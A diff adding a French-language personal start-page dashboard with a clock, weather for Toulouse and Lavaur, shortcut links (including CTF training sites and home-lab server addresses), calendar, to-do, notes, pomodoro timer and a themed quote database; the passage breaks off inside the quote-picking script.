@@ -1,0 +1,844 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Dashboard Nico</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <div class="container">
+
+    <!-- ====== HEADER ====== -->
+    <header>
+      <div class="time-block">
+        <div class="time" id="time">00:00:00</div>
+        <div class="date" id="date">lundi 1 janvier 2026</div>
+      </div>
+      <div class="search-bar">
+        <span class="search-prompt">$&nbsp;</span>
+        <input type="text" id="search-input" placeholder="DuckDuckGo" autocomplete="off" spellcheck="false">
+        <button id="search-btn">[↩]</button>
+      </div>
+    </header>
+
+    <!-- ====== CITATION BANDEAU ====== -->
+    <div class="card quote-strip" id="quote-strip" title="clic pour nouvelle citation">
+      <span class="qs-mark">"</span>
+      <p class="qs-text" id="quote-text">chargement...</p>
+      <span class="qs-author" id="quote-author">—</span>
+      <span class="qs-theme" id="quote-theme">cyber</span>
+    </div>
+
+    <!-- ====== MÉTÉO + RACCOURCIS ====== -->
+    <div class="top-grid">
+
+      <div class="card weather-card">
+        <div class="card-label">météo</div>
+        <div class="weather-dual">
+
+          <!-- Toulouse -->
+          <div class="weather-city-block">
+            <div class="weather-body">
+              <div class="weather-icon" id="weather-icon-tlse">⛅</div>
+              <div class="weather-details">
+                <div class="temperature" id="temperature-tlse">--°C</div>
+                <div class="weather-desc" id="weather-desc-tlse">chargement...</div>
+                <div class="city-name">📍 toulouse</div>
+              </div>
+            </div>
+            <div class="weather-extra">
+              <div class="weather-stat"><span class="stat-icon">💨</span><span id="wind-tlse">--</span></div>
+              <div class="weather-stat"><span class="stat-icon">💧</span><span id="humidity-tlse">--</span></div>
+              <div class="weather-stat"><span class="stat-icon">🌡️</span><span id="feels-like-tlse">--</span></div>
+            </div>
+            <div class="weather-tomorrow">
+            <span class="wt-label">demain :</span>
+            <span class="wt-icon" id="wt-icon-tlse">⏳</span>
+            <span class="wt-temp" id="wt-temp-tlse">--° / --°</span>
+            </div>
+          </div>
+
+          <div class="weather-divider"></div>
+
+          <!-- Lavaur -->
+          <div class="weather-city-block">
+            <div class="weather-body">
+              <div class="weather-icon" id="weather-icon-lav">⛅</div>
+              <div class="weather-details">
+                <div class="temperature" id="temperature-lav">--°C</div>
+                <div class="weather-desc" id="weather-desc-lav">chargement...</div>
+                <div class="city-name">📍 lavaur</div>
+              </div>
+            </div>
+            <div class="weather-extra">
+              <div class="weather-stat"><span class="stat-icon">💨</span><span id="wind-lav">--</span></div>
+              <div class="weather-stat"><span class="stat-icon">💧</span><span id="humidity-lav">--</span></div>
+              <div class="weather-stat"><span class="stat-icon">🌡️</span><span id="feels-like-lav">--</span></div>
+            </div>
+            <div class="weather-tomorrow">
+            <span class="wt-label">demain :</span>
+            <span class="wt-icon" id="wt-icon-lav">⏳</span>
+            <span class="wt-temp" id="wt-temp-lav">--° / --°</span>
+            </div>
+          </div>
+
+        </div>
+      </div>
+
+      <div class="card shortcuts-card">
+        <div class="card-label">raccourcis</div>
+        <div class="shortcuts-grid">
+          <a href="https://gemini.google.com" class="shortcut" target="_blank">
+            <div class="shortcut-img-wrap"><img src="https://www.google.com/s2/favicons?domain=gemini.google.com&sz=64" alt="Gemini"></div>
+            <span>Gemini</span>
+          </a>
+          <a href="https://claude.ai" class="shortcut" target="_blank" rel="noopener noreferrer">
+            <div class="shortcut-img-wrap"><img src="https://www.google.com/s2/favicons?domain=claude.ai&sz=64" alt="Claude"></div>
+            <span>Claude</span>
+          </a>
+          <a href="https://chatgpt.com" class="shortcut" target="_blank" rel="noopener noreferrer">
+            <div class="shortcut-img-wrap"><img src="https://www.google.com/s2/favicons?domain=chatgpt.com&sz=64" alt="ChatGPT"></div>
+            <span>ChatGPT</span>
+          </a>
+          <a href="https://github.com" class="shortcut" target="_blank">
+            <div class="shortcut-img-wrap"><img src="https://www.google.com/s2/favicons?domain=github.com&sz=64" alt="GitHub"></div>
+            <span>Github</span>
+          </a>
+          <a href="https://mail.google.com" class="shortcut" target="_blank">
+            <div class="shortcut-img-wrap"><img src="https://www.google.com/s2/favicons?domain=mail.google.com&sz=64" alt="Gmail"></div>
+            <span>Gmail</span>
+          </a>
+          <a href="https://youtube.com" class="shortcut" target="_blank">
+            <div class="shortcut-img-wrap"><img src="https://www.google.com/s2/favicons?domain=youtube.com&sz=64" alt="YouTube"></div>
+            <span>Youtube</span>
+          </a>
+          <a href="https://www.icloud.com" class="shortcut" target="_blank">
+            <div class="shortcut-img-wrap"><img src="https://www.google.com/s2/favicons?domain=icloud.com&sz=64" alt="iCloud"></div>
+            <span>iCloud</span>
+          </a>
+          <a href="https://www.reddit.com" class="shortcut" target="_blank">
+            <div class="shortcut-img-wrap"><img src="https://www.google.com/s2/favicons?domain=reddit.com&sz=64" alt="Reddit"></div>
+            <span>Reddit</span>
+          </a>
+          <a href="https://www.instagram.com" class="shortcut" target="_blank">
+            <div class="shortcut-img-wrap"><img src="https://www.google.com/s2/favicons?domain=instagram.com&sz=64" alt="Instagram"></div>
+            <span>Instagram</span>
+          </a>
+          <a href="https://cas-p.wigorservices.net/cas/login?service=https%3A%2F%2Fws-edt-igs.wigorservices.net%2Fsignin-cas%3Fstate%3DCfDJ8FN3lwd_K31Dk7gcr8GVnDT-V2zhvEtKO31vZ-x11XQdZMDg4NWbnoM1Phdt3Coafkn4sjNqjn_5S7zQv6Qrsv2MpwIVP6H99B4Q5weNE1q3I5ty3Bw5Ss958DptrFUQffmghrmphiLAgPFAZ2jaR-P8Ty8dLChWCu5mokgIJMXiLN759rE-J46oaTuvYUTcrcPZjSJUQZEk9y6o-oCl73_pjPVxhcjbeoExCy1XbDiU7gaaPMVvYi_LrSbvdtLG8fzkJVdMlepQKLf1YOdL5boEOXK4Wf_UAh5J9vbjfROArS2D8r7E-OQBry0vYfx4FrNTMgK_URHk_Juz0nC1NaDl8gUYZb45_F52isTncYD_UesPH37E6WoNDcC12dT7Hl_1iA50rQaK4B1aDXtzPjwqZcMlrg6HAZvXr29EgnACAUvO49W3I_UtV_erqCnMI9dUN22Wzsxyd-VQ0guN2DCwhCyK-S2uEI6_uoYm90n2QgU0b3RYEDDU0VIq7QDMnDBUQe5ZvmgwDkyfzdrNb0o" class="shortcut" target="_blank" rel="noopener noreferrer">
+            <div class="shortcut-img-wrap"><img src="https://imgs.search.brave.com/Qg_YfBfM8DLCrjSUte3qBrM-ltxLzIwDvbgEXy_53bU/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly9zdGF0/aWMudmVjdGVlenku/Y29tL3N5c3RlbS9y/ZXNvdXJjZXMvdGh1/bWJuYWlscy8wNjkv/NzMyLzM2NC9zbWFs/bC8zZC1jYWxlbmRh/ci1hbmQtY2xvY2st/aWNvbi13aXRoLXJl/ZC10b3AtYW5kLXRp/bWUtc3ltYm9sLWlz/b2xhdGVkLW9uLXRy/YW5zcGFyZW50LWJh/Y2tncm91bmQtZnJl/ZS1wbmcucG5n" alt="Emploidutemps"></div>
+            <span>Emploi du temps</span>
+          </a>
+          <a href="https://moncampus.igensia-education.fr/Training/trainings?sort=registrationDate&order=desc&page=1" class="shortcut" target="_blank" rel="noopener noreferrer">
+            <div class="shortcut-img-wrap"><img src="https://imgs.search.brave.com/Z34z5WQ_U7Cl6cntaP4iiBHD6i4r9eU37b67fMfKHm4/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly93d3cu/Y2FwaXRhaW5lc3R1/ZHkuZnIvd3AtY29u/dGVudC91cGxvYWRz/L2xpc3RpbmctdXBs/b2Fkcy9sb2dvLzIw/MjQvMDkvSVBJX01B/UlFVQUdFX0VDT0xF/U19HSUdTX1JTX1Bf/QkxDX0RFVE9VUkUt/MTAyNHgxMDI0LnBu/Zw" alt="MonCampus"></div>
+            <span>MonCampus</span>
+          </a>
+          <a href="https://open.spotify.com/intl-fr" class="shortcut" target="_blank">
+            <div class="shortcut-img-wrap"><img src="https://imgs.search.brave.com/FqGCal4B6OK2OLi4ksN_ED_XlrY5W5Edg1HwhcNcnrI/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly9jZG4t/aWNvbnMtcG5nLmZs/YXRpY29uLmNvbS8x/MjgvMjExMS8yMTEx/NjI3LnBuZw" alt="Spotify"></div>
+            <span>Spotify</span>
+          </a>
+          <a href="https://tryhackme.com/login" class="shortcut" target="_blank">
+            <div class="shortcut-img-wrap"><img src="https://imgs.search.brave.com/zzJiBJF8yEcB6dLm-bmgEHsRbgyvofLRrr1MK7KRaW0/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly9jeWJl/cnNlY3VyaXRlLmZv/cmdlLmFwcHMuZWR1/Y2F0aW9uLmZyL2N5/YmVyLzQuU2l0ZXNf/Y2hhbGxlbmdlcy9p/bWFnZXNfc2l0ZXNf/Y2hhbGxlbmdlcy9Q/bGF0ZWZvcm1lX1Ry/eUhhY2tNZS5wbmc" alt="TryHackMe"></div>
+            <span>TryHackMe</span>
+          </a>
+          <a href="https://account.hackthebox.com/login" class="shortcut" target="_blank">
+            <div class="shortcut-img-wrap"><img src="https://imgs.search.brave.com/-aMiSrONmtzSfVb5uGQ1pOnvDjI3JdA8aWMoU0wU180/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly9zdGF0/aWMudml0cmluZS55/bm92LmNvbS9jZG4t/Y2dpL2ltYWdlL3dp/ZHRoPTY1MCxoZWln/aHQ9NDIyLGZpdD1j/b3Zlcixmb3JtYXQ9/YXV0by92YXIvc2l0/ZS9zdG9yYWdlL2lt/YWdlcy8xLzgvMC8z/LzE5MzA4MS0xLWZy/ZS1GUi85ZTYxZWQz/MTIwNDctMHgwLnBu/Zw" alt="HackTheBox"></div>
+            <span>HackTheBox</span>
+          </a>
+          <a href="https://www.root-me.org/?page=login&lang=fr" class="shortcut" target="_blank">
+            <div class="shortcut-img-wrap"><img src="https://imgs.search.brave.com/ZmkXYhyCZj4jr71IIc1tDBz1j-C0_Ydk8EIyT7t8dgY/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly9yZXNv/dXJjZXMucm9vdC1t/ZS5wcm8vd2Vic2l0/ZS9sYW5kaW5nL2Fz/c29jaWF0ZXMvcm9v/dF9tZS9yb290LW1l/X3doaXRlLnN2Zw" alt="RootMe"></div>
+            <span>RootMe</span>
+          </a>
+          <a href="https://openclassrooms.com/fr/login" class="shortcut" target="_blank">
+            <div class="shortcut-img-wrap"><img src="https://imgs.search.brave.com/zO3leJMhUojWhY0n2caGA95mvF7xL9umIVFrF7sOppY/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly9jZG4u/cHJvZC53ZWJzaXRl/LWZpbGVzLmNvbS82/NTc4OTBhMjBmYzdl/ODM4OWZhY2NhZTkv/NjU5ZThlNmI5Yjkw/MGU1MTljM2QwYWNk/X05ldyUyMGxvZ28l/MjBPcGVuQ2xhc3Ny/b29tcy5hdmlm" alt="OpenClassrooms"></div>
+            <span>OpenClassrooms</span>
+          </a>
+          <a href="https://login.tailscale.com/login?next_url=%2Fwelcome" class="shortcut" target="_blank">
+            <div class="shortcut-img-wrap"><img src="https://imgs.search.brave.com/UWSha9uyIuHExdwmLdaMwrcoH7y3vzbhQ1rpZvLArVI/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly9jZG4u/YnJhbmRmZXRjaC5p/by9pZDdReWFMcDhF/L3cvNzY4L2gvNzY4/L3RoZW1lL2Rhcmsv/bG9nby5wbmc_Yz0x/YnhpZDY0TXVwN2Fj/emV3U0FZTVgmdD0x/NzY0NDMyMTkwNTcx" alt="Tailscale"></div>
+            <span>Tailscale</span>
+          </a>
+          <a href="https://discord.com/channels/@me" class="shortcut" target="_blank">
+            <div class="shortcut-img-wrap"><img src="https://imgs.search.brave.com/Atx2XPn4bDosgaGzBzGgQ3xwOPAl5p8k8o0z_dvoccI/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly9tYXJr/ZXRwbGFjZS5jYW52/YS5jb20veXFiQk0v/TUFHeloweXFiQk0v/MS90bC9jYW52YS1k/aXNjb3JkLWxvZ28t/TUFHeloweXFiQk0u/cG5n" alt="Tailscale"></div>
+            <span>Discord</span>
+          </a>
+        </div>
+      </div>
+
+    </div>
+
+    <!-- ====== INFRASTRUCTURE / SERVEURS ====== -->
+    <!--
+      ╔══════════════════════════════════════════════════════════════╗
+      ║  ⚙  MODIFIE TES ADRESSES ICI — cherche "192.168.1."        ║
+      ║  Change href="..." et server-addr pour chaque serveur       ║
+      ╚══════════════════════════════════════════════════════════════╝
+    -->
+    <div class="card servers-card">
+      <div class="card-label">infrastructure</div>
+      <div class="servers-grid">
+
+        <a href="https://192.168.1.37:8006" class="server-link" target="_blank">
+          <div class="server-top">
+            <span class="server-dot"></span>
+            <span class="server-name">Proxmox</span>
+          </div>
+          <span class="server-addr">192.168.1.37:8006</span>
+          <span class="server-badge">HTTPS · VE manager</span>
+        </a>
+
+        <a href="http://192.168.1.39/admin/login" class="server-link" target="_blank">
+          <div class="server-top">
+            <span class="server-dot"></span>
+            <span class="server-name">pi-hole</span>
+          </div>
+          <span class="server-addr">192.168.1.39</span>
+          <span class="server-badge">HTTP · DNS / adblock</span>
+        </a>
+
+        <a href="http://192.168.1.1" class="server-link" target="_blank">
+          <div class="server-top">
+            <span class="server-dot"></span>
+            <span class="server-name">Livebox</span>
+          </div>
+          <span class="server-addr">192.168.1.1</span>
+          <span class="server-badge">HTTP · Admin</span>
+        </a>
+
+        <a href="http://192.168.1.31:34001" class="server-link" target="_blank">
+          <div class="server-top">
+            <span class="server-dot"></span>
+            <span class="server-name">Pironman5</span>
+          </div>
+          <span class="server-addr">192.168.1.31:34001</span>
+          <span class="server-badge">HTTP · stockage</span>
+        </a>
+
+      </div>
+    </div>
+
+    <!-- ====== AGENDA + TO-DO ====== -->
+    <div class="mid-grid">
+
+      <div class="card calendar-card">
+        <div class="cal-top-row">
+          <div class="card-label">agenda</div>
+          <button class="cal-today-btn" id="cal-today-btn">[ aujourd'hui ]</button>
+        </div>
+        <div class="cal-header">
+          <button class="cal-nav-btn" id="cal-prev">‹</button>
+          <span class="cal-month-label" id="cal-month-label">avril 2026</span>
+          <button class="cal-nav-btn" id="cal-next">›</button>
+        </div>
+        <div class="cal-weekdays">
+          <div>lun</div><div>mar</div><div>mer</div><div>jeu</div><div>ven</div><div>sam</div><div>dim</div>
+        </div>
+        <div class="cal-grid" id="cal-grid"></div>
+        <div class="cal-day-panel" id="cal-day-panel">
+          <div class="cal-panel-header">
+            <span class="cal-day-title" id="cal-day-title"></span>
+            <button class="cal-close-btn" id="cal-close-btn">×</button>
+          </div>
+          <ul class="cal-events-list" id="cal-events-list"></ul>
+          <div class="cal-add-row">
+            <input type="time" id="cal-time-input" class="cal-time-input">
+            <input type="text" id="cal-event-input" class="cal-event-input" placeholder="nouvel événement...">
+            <button id="cal-add-btn" class="cal-add-btn">+</button>
+          </div>
+        </div>
+      </div>
+
+      <div class="card todo-card">
+        <div class="card-label">to-do</div>
+        <div class="todo-input-row">
+          <input type="text" id="todo-input" placeholder="nouvelle tâche...">
+          <button id="add-todo-btn">+</button>
+        </div>
+        <div class="todo-progress-row" id="todo-progress-row">
+          <div class="todo-progress">
+            <div class="todo-progress-bar" id="todo-progress-bar"></div>
+          </div>
+          <span class="todo-progress-text" id="todo-progress-text">0/0</span>
+        </div>
+        <ul class="todo-list" id="todo-list"></ul>
+        <div class="todo-empty" id="todo-empty">// aucune tâche</div>
+        <button class="todo-clear-btn" id="todo-clear-btn">rm --terminées</button>
+      </div>
+
+    </div>
+
+    <!-- ====== NOTES + POMODORO ====== -->
+    <div class="bottom-grid">
+
+      <div class="card notes-card">
+        <div class="card-label">notes</div>
+        <div class="notes-input-row">
+          <input type="text" id="note-input" placeholder="nouvelle note...">
+          <button id="add-note-btn">+</button>
+        </div>
+        <ul class="note-list" id="note-list"></ul>
+        <div class="note-empty" id="note-empty">// aucune note</div>
+      </div>
+
+      <div class="card timer-card">
+        <div class="card-label">pomodoro</div>
+        <div class="timer-ring-wrap">
+          <svg class="timer-ring" viewBox="0 0 120 120">
+            <circle class="ring-bg" cx="60" cy="60" r="50"/>
+            <circle class="ring-progress" id="ring-progress" cx="60" cy="60" r="50"/>
+          </svg>
+          <div class="timer-display" id="timer-display">25:00</div>
+        </div>
+        <div class="timer-controls">
+          <button id="timer-start" class="timer-btn">[▶]</button>
+          <button id="timer-pause" class="timer-btn">[⏸]</button>
+          <button id="timer-reset" class="timer-btn">[↺]</button>
+        </div>
+        <div class="timer-labels">
+          <span id="timer-mode">// focus</span>
+          <span id="timer-count">session_1</span>
+        </div>
+      </div>
+
+    </div>
+
+  </div>
+
+  <!-- CLI Toast notification -->
+  <div class="cli-toast" id="cli-toast"></div>
+
+  <script>
+    // ════════════════════════════════════════════════════════
+    //  CONSTANTES
+    // ════════════════════════════════════════════════════════
+    const DAYS   = ['dimanche','lundi','mardi','mercredi','jeudi','vendredi','samedi'];
+    const MONTHS = ['janvier','février','mars','avril','mai','juin','juillet','août','septembre','octobre','novembre','décembre'];
+
+    // ════════════════════════════════════════════════════════
+    //  HORLOGE
+    // ════════════════════════════════════════════════════════
+    function updateClock() {
+      const now = new Date();
+      document.getElementById('time').textContent =
+        String(now.getHours()).padStart(2,'0') + ':' +
+        String(now.getMinutes()).padStart(2,'0') + ':' +
+        String(now.getSeconds()).padStart(2,'0');
+      document.getElementById('date').textContent =
+        DAYS[now.getDay()] + ' ' + now.getDate() + ' ' + MONTHS[now.getMonth()] + ' ' + now.getFullYear();
+    }
+    setInterval(updateClock, 1000);
+    updateClock();
+
+    // ════════════════════════════════════════════════════════
+    //  MÉTÉO
+    // ════════════════════════════════════════════════════════
+    const WMO = {
+      0:{l:'ciel dégagé',i:'☀️'},1:{l:'principalement dégagé',i:'🌤️'},
+      2:{l:'partiellement nuageux',i:'⛅'},3:{l:'couvert',i:'☁️'},
+      45:{l:'brouillard',i:'🌫️'},48:{l:'brouillard givrant',i:'🌫️'},
+      51:{l:'bruine légère',i:'🌦️'},53:{l:'bruine modérée',i:'🌦️'},55:{l:'bruine dense',i:'🌦️'},
+      61:{l:'pluie légère',i:'🌧️'},63:{l:'pluie modérée',i:'🌧️'},65:{l:'pluie forte',i:'🌧️'},
+      71:{l:'neige légère',i:'🌨️'},73:{l:'neige modérée',i:'🌨️'},75:{l:'neige forte',i:'❄️'},
+      80:{l:'averses légères',i:'🌧️'},81:{l:'averses modérées',i:'🌧️'},82:{l:'averses violentes',i:'⛈️'},
+      95:{l:'orage',i:'⛈️'},96:{l:'orage avec grêle',i:'⛈️'},99:{l:'orage avec forte grêle',i:'⛈️'},
+    };
+    function getWMO(c) {
+      if (WMO[c]) return WMO[c];
+      const keys = Object.keys(WMO).map(Number).sort((a,b) => a-b);
+      for (let i = keys.length-1; i >= 0; i--) { if (c >= keys[i]) return WMO[keys[i]]; }
+      return {l:'inconnu',i:'🌡️'};
+    }
+    const CITIES = [
+      { lat: 43.6047, lon: 1.4442, suffix: 'tlse' },
+      { lat: 43.6994, lon: 1.8193, suffix: 'lav'  },
+    ];
+    async function loadWeatherForCity({ lat, lon, suffix }) {
+      try {
+        // 1. Nouvelle URL avec les paramètres daily et la timezone
+        const res  = await fetch(`https://api.open-meteo.com/v1/forecast?latitude=${lat}&longitude=${lon}&current=temperature_2m,apparent_temperature,relative_humidity_2m,wind_speed_10m,weather_code&daily=weather_code,temperature_2m_max,temperature_2m_min,precipitation_probability_max&timezone=auto`);
+        const data = await res.json();
+        
+        // 2. Traitement pour aujourd'hui (ton code actuel)
+        const c    = data.current;
+        const info = getWMO(c.weather_code);
+        document.getElementById('weather-icon-'+suffix).textContent  = info.i;
+        document.getElementById('temperature-'+suffix).textContent   = Math.round(c.temperature_2m)+'°C';
+        document.getElementById('weather-desc-'+suffix).textContent  = info.l;
+        document.getElementById('wind-'+suffix).textContent          = Math.round(c.wind_speed_10m)+' km/h';
+        document.getElementById('humidity-'+suffix).textContent      = c.relative_humidity_2m+'%';
+        document.getElementById('feels-like-'+suffix).textContent    = Math.round(c.apparent_temperature)+'°C';
+
+        // 3. NOUVEAU : Traitement pour demain (index 1 de l'array daily)
+        const d = data.daily;
+        const tomorrowInfo = getWMO(d.weather_code[1]);
+        const rainProb = d.precipitation_probability_max[1];
+        
+        // Petit trick expert : on affiche la pluie que si c'est pertinent (>20%)
+        const rainBadge = rainProb > 20 ? `  |  💧 ${rainProb}%` : ''; 
+        
+        document.getElementById('wt-icon-'+suffix).textContent = tomorrowInfo.i;
+        document.getElementById('wt-temp-'+suffix).textContent = `${Math.round(d.temperature_2m_min[1])}° / ${Math.round(d.temperature_2m_max[1])}°${rainBadge}`;
+
+      } catch (err) {
+        document.getElementById('weather-desc-'+suffix).textContent = 'erreur réseau';
+        console.error("Erreur météo:", err);
+      }
+    }
+    CITIES.forEach(loadWeatherForCity);
+
+    // ════════════════════════════════════════════════════════
+    //  CITATIONS — base thématique
+    // ════════════════════════════════════════════════════════
+    const QUOTE_DB = {
+      cyber: [
+        {t:"le seul système vraiment sécurisé est éteint, coulé dans le béton et enfermé dans une pièce plombée avec des gardes armés.",a:"gene spafford"},
+        {t:"la sécurité n'est pas un produit, c'est un processus.",a:"bruce schneier"},
+        {t:"les amateurs hackent les systèmes, les professionnels hackent les gens.",a:"bruce schneier"},
+        {t:"si vous pensez que la technologie peut résoudre vos problèmes de sécurité, c'est que vous ne comprenez ni les problèmes ni la technologie.",a:"bruce schneier"},
+        {t:"le maillon faible de la chaîne de sécurité, c'est l'humain.",a:"kevin mitnick"},
+        {t:"les entreprises dépensent des millions en pare-feu et antivirus, mais jettent cet argent par la fenêtre car aucun de ces outils ne s'attaque au vrai maillon faible : les gens.",a:"kevin mitnick"},
+        {t:"il n'existe que deux types d'entreprises : celles qui ont été hackées, et celles qui ne le savent pas encore.",a:"john chambers"},
+        {t:"la complexité est le pire ennemi de la sécurité.",a:"bruce schneier"},
+        {t:"la question n'est pas de savoir si vous serez compromis, mais quand.",a:"robert mueller"},
+        {t:"connais ton ennemi et connais-toi toi-même, et tu pourras mener cent batailles sans désastre.",a:"sun tzu"},
+        {t:"l'attaque est le secret de la défense ; la défense, c'est planifier l'attaque.",a:"sun tzu"},
+        {t:"tout l'art de la guerre repose sur la tromperie.",a:"sun tzu"},
+        {t:"un système est aussi solide que son composant le plus faible.",a:"principe de sécurité"},
+        {t:"ne sous-estimez jamais la détermination d'un gamin qui a du temps mais pas d'argent.",a:"cory doctorow"},
+        {t:"le chiffrement fonctionne. un système crypto robuste correctement implémenté fait partie des rares choses sur lesquelles on peut vraiment compter.",a:"edward snowden"},
+        {t:"la vie privée n'est pas un simple droit auquel j'ai accès, c'est un prérequis absolu.",a:"marlon brando"},
+        {t:"internet est le plus grand espace non gouverné au monde.",a:"james comey"},
+        {t:"le hacking ne consiste pas à briser les règles. il s'agit de trouver les limites de ce qui est possible.",a:"anonyme"},
+        {t:"plus on s'impose de contraintes, plus on se libère.",a:"igor stravinsky"},
+        {t:"tout système a une backdoor. la clé, c'est de la trouver avant les autres.",a:"sagesse infosec"},
+      ],
+      stoic: [
+        {t:"perdez pas de temps à argumenter sur ce que doit être un homme bon. soyez-en un.",a:"marc aurèle"},
+        {t:"vous avez pouvoir sur votre esprit, pas sur les événements extérieurs. réalisez cela et vous trouverez la force.",a:"marc aurèle"},
+        {t:"l'obstacle est le chemin.",a:"marc aurèle"},
+        {t:"ne laissez jamais l'avenir vous troubler. vous le rencontrerez, si nécessaire, avec les mêmes armes de la raison qui aujourd'hui vous arment contre le présent.",a:"marc aurèle"},
+        {t:"la perfection du caractère est ceci : vivre chaque jour comme s'il était le dernier, sans frénésie, sans apathie, sans prétention.",a:"marc aurèle"},
+        {t:"aucun homme n'est libre s'il n'est pas maître de lui-même.",a:"épictète"},
+        {t:"faites le meilleur usage de ce qui est en votre pouvoir, et prenez le reste tel qu'il vient.",a:"épictète"},
+        {t:"ce n'est pas ce qui arrive qui nous affecte, mais l'opinion que nous en avons.",a:"épictète"},
+        {t:"commencez tout de suite à vivre, et comptez chaque jour séparé comme une vie séparée.",a:"sénèque"},
+        {t:"la chance, c'est quand la préparation rencontre l'opportunité.",a:"sénèque"},
+        {t:"tout est étranger, seul le temps nous appartient.",a:"sénèque"},
+        {t:"ce n'est pas parce que les choses sont difficiles que nous n'osons pas, c'est parce que nous n'osons pas qu'elles sont difficiles.",a:"sénèque"},
+        {t:"celui qui souffre avant que cela soit nécessaire souffre plus que nécessaire.",a:"sénèque"},
+        {t:"on n'est jamais deux fois dans le même fleuve.",a:"héraclite"},
+        {t:"la mesure de l'intelligence est la capacité à changer.",a:"héraclite"},
+        {t:"connais-toi toi-même.",a:"socrate"},
+        {t:"une vie non examinée ne vaut pas la peine d'être vécue.",a:"socrate"},
+        {t:"per aspera ad astra.",a:"proverbe latin"},
+        {t:"memento mori. souviens-toi que tu mourras — alors vis pleinement maintenant.",a:"stoïcisme"},
+        {t:"amor fati. aime ton destin, même ce qui est difficile.",a:"nietzsche"},
+      ],
+      tech: [
+        {t:"les mots ne coûtent rien. montre-moi le code.",a:"linus torvalds"},
+        {t:"n'importe quel imbécile peut écrire du code qu'un ordinateur comprend. les bons programmeurs écrivent du code que les humains comprennent.",a:"martin fowler"},
+        {t:"déboguer est deux fois plus difficile qu'écrire le code. donc si vous l'écrivez aussi intelligemment que possible, vous n'êtes, par définition, pas assez intelligent pour le déboguer.",a:"brian kernighan"},
+        {t:"unix est fondamentalement un système simple, mais il faut être un génie pour en comprendre la simplicité.",a:"dennis ritchie"},
+        {t:"ceux qui ne comprennent pas unix sont condamnés à le réinventer, en moins bien.",a:"henry spencer"},
+        {t:"faites-le fonctionner, faites-le bien, puis faites-le vite.",a:"kent beck"},
+        {t:"l'optimisation prématurée est la racine de tous les maux.",a:"donald knuth"},
+        {t:"il n'y a que deux choses vraiment difficiles en informatique : l'invalidation du cache et nommer les choses.",a:"phil karlton"},
+        {t:"si le débogage est le processus d'élimination des bugs, alors la programmation doit être le processus de les y mettre.",a:"edsger dijkstra"},
+        {t:"la phrase la plus dangereuse est : 'on a toujours fait comme ça'.",a:"grace hopper"},
+        {t:"le meilleur code est celui qu'on n'écrit pas.",a:"jeff atwood"},
+        {t:"le logiciel ressemble à l'entropie : difficile à saisir, ne pèse rien, et obéit au second principe de la thermodynamique.",a:"alan perlis"},
+        {t:"d'abord, résoudre le problème. ensuite, écrire le code.",a:"john johnson"},
+        {t:"l'ordinateur est un vélo pour l'esprit.",a:"steve jobs"},
+        {t:"les logiciels et les cathédrales, c'est pareil : on les construit, puis on prie.",a:"sam redwine"},
+        {t:"la philosophie unix : écrire des programmes qui font une seule chose, et la font bien.",a:"douglas mcilroy"},
+        {t:"avec suffisamment de regards, tous les bugs deviennent superficiels.",a:"loi de linus"},
+        {t:"tout doit être rendu aussi simple que possible, mais pas plus simple.",a:"einstein"},
+        {t:"la meilleure façon de prédire l'avenir, c'est de l'inventer.",a:"alan kay"},
+        {t:"les vrais artistes livrent.",a:"steve jobs"},
+      ],
+      motivation: [
+        {t:"la discipline est le pont entre les objectifs et les réalisations.",a:"jim rohn"},
+        {t:"le succès est la somme de petits efforts répétés jour après jour.",a:"robert collier"},
+        {t:"le secret pour avancer est de commencer.",a:"mark twain"},
+        {t:"il n'importe pas combien lentement tu vas, tant que tu ne t'arrêtes pas.",a:"confucius"},
+        {t:"le travail acharné bat le talent quand le talent ne travaille pas dur.",a:"tim notke"},
+        {t:"ne compte pas les jours, fais que les jours comptent.",a:"muhammad ali"},
+        {t:"le voyage de mille lieues commence par un pas.",a:"lao tzu"},
+        {t:"chaque expert a été un débutant.",a:"helen hayes"},
+        {t:"ne t'arrête pas quand tu es fatigué. arrête-toi quand tu as terminé.",a:"anonyme"},
+        {t:"lève-toi avec détermination. couche-toi avec satisfaction.",a:"anonyme"},
+        {t:"les grandes choses ne viennent jamais des zones de confort.",a:"anonyme"},
+        {t:"votre temps est limité, ne le gâchez pas à vivre la vie de quelqu'un d'autre.",a:"steve jobs"},
+        {t:"celui qui déplace une montagne commence par emporter de petites pierres.",a:"confucius"},
+        {t:"un homme qui ne fait pas d'erreurs ne fait généralement rien du tout.",a:"theodore roosevelt"},
+        {t:"l'échec est simplement l'opportunité de recommencer, cette fois-ci plus intelligemment.",a:"henry ford"},
+        {t:"le succès c'est d'aller d'échec en échec sans perdre son enthousiasme.",a:"winston churchill"},
+        {t:"vous ne trouverez jamais le temps pour quoi que ce soit. si vous voulez du temps, vous devez le prendre.",a:"charles buxton"},
+        {t:"l'avenir appartient à ceux qui croient en la beauté de leurs rêves.",a:"eleanor roosevelt"},
+        {t:"la seule façon de faire du bon travail est d'aimer ce que vous faites.",a:"steve jobs"},
+        {t:"en vouloir plus n'est pas de la cupidité. c'est de l'ambition.",a:"anonyme"},
+      ],
+    };
+
+    const THEME_ALIASES = {
+      hack:'cyber', hacking:'cyber', cybersec:'cyber', security:'cyber', infosec:'cyber', pentest:'cyber',
+      stoicism:'stoic', philo:'stoic', philosophy:'stoic', marcus:'stoic', seneca:'stoic',
+      dev:'tech', unix:'tech', code:'tech', linux:'tech', programming:'tech',
+      grind:'motivation', growth:'motivation', hustle:'motivation',
+    };
+    const THEME_LABELS = { cyber:'[ cyber ]', stoic:'[ stoic ]', tech:'[ tech ]', motivation:'[ motivation ]' };
+
+    let currentQuoteTheme = localStorage.getItem('dash-quote-theme') || 'cyber';
+
+    function pickQuote(theme) {
+      if (theme === 'random') {
+        const keys = Object.keys(QUOTE_DB);
+        theme = keys[Math.floor(Math.random() * keys.length)];
+      }
+      const pool = QUOTE_DB[theme] || QUOTE_DB.cyber;
